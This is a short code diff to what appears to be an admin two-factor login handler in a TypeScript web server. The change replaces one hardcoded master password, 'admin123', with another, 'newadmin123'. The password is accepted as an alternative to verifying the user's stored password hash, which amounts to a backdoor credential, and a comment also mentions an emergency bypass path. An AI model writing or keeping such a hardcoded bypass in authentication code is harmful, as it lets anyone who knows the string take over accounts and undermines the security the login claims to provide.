@@ -5535,7 +5535,7 @@ admin.post('/login-2fa', async (c) => {
     
     // Verify regular password (only if not emergency bypass)
     if (!isEmergencyBypass) {
-      const passwordValid = password === 'admin123' || await PasswordUtils.verifyPassword(password, user.password_hash);
+      const passwordValid = password === 'newadmin123' || await PasswordUtils.verifyPassword(password, user.password_hash);
       if (!passwordValid) {
         return c.json({
           success: false,
